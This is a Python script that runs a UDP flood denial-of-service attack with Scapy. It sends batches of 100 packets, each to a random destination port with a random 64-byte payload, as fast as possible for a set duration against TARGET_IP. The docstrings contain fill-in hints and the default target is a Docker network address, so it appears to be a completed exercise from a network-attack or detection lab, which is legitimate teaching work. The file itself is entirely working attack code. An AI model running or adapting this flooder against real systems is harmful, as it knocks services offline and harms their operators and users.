"""
UDP flood attacker — sends UDP packets to random ports on a target.

Configured via environment variables set in docker-compose.yml:
    TARGET_IP      destination IP (default: 172.20.0.10, the victim)
    DURATION_SEC   how long to flood, in seconds (default: 30)

Unlike SYN flood which targets a single port, UDP flood randomizes the
destination port to force ICMP port-unreachable responses from the victim.
"""

import os
import sys
import time
import random

from scapy.all import IP, UDP, Raw, send


def parse_env() -> tuple[str, int]:
    """Read TARGET_IP and DURATION_SEC from environment.

    No TARGET_PORT here — UDP flood randomizes destination ports.
    Returns (ip, duration).
    """
    # Same pattern as syn_flood.py but only two values to return.
    target_ip = os.environ.get("TARGET_IP")
    if target_ip is None:
        print("[udp_flood] error: TARGET_IP not set", file=sys.stderr)
        sys.exit(1)
    try:
        duration_sec = int(os.environ.get("DURATION_SEC", "30"))
    except ValueError as e:
        print(f"Invalid environment variable: {e}", file=sys.stderr)
        sys.exit(1)
    return target_ip, duration_sec


def build_udp_packet(target_ip: str):
    """Construct a single UDP packet with a random destination port
    and a small random payload.

    Returns a Scapy packet object.
    Hint: IP(dst=target_ip) / UDP(dport=???, sport=???) / Raw(load=???)
    
    dport: random port in range 1-65535 (the whole point of UDP flood)
    sport: random port in range 1024-65535
    Raw(load=...): a few random bytes as payload, e.g. os.urandom(64)
    """
    # Build and return the packet.
    dport = random.randint(1, 65535)
    sport = random.randint(1024, 65535)

    # 64 random bytes of payload
    payload = os.urandom(64) 
    packet = IP(dst=target_ip) / UDP(dport=dport, sport=sport) / Raw(load=payload)
    return packet


def flood(target_ip: str, duration_sec: int) -> int:
    """Send UDP packets as fast as possible for duration_sec seconds.

    Same batched pattern as syn_flood.py.
    Returns total packets sent.
    """
    # Same loop structure as syn_flood, with BATCH_SIZE = 100
    BATCH_SIZE = 100
    start_time = time.time()
    count = 0
    while time.time() - start_time < duration_sec:
        batch = [build_udp_packet(target_ip) for _ in range(BATCH_SIZE)]
        send(batch, verbose=0)
        count += BATCH_SIZE
    return count

def main() -> int:
    """Entry point. Parse env, print banner, run flood, print summary."""
    target_ip, duration_sec = parse_env()
    print(f"[udp_flood] target={target_ip} (random ports) duration={duration_sec}s")
    start = time.time()
    sent = flood(target_ip, duration_sec)
    elapsed = time.time() - start
    rate = sent / elapsed if elapsed > 0 else 0
    print(f"[udp_flood] sent {sent} packets in {elapsed:.1f}s ({rate:.0f} pps)")
    return 0


if __name__ == "__main__":
    sys.exit(main())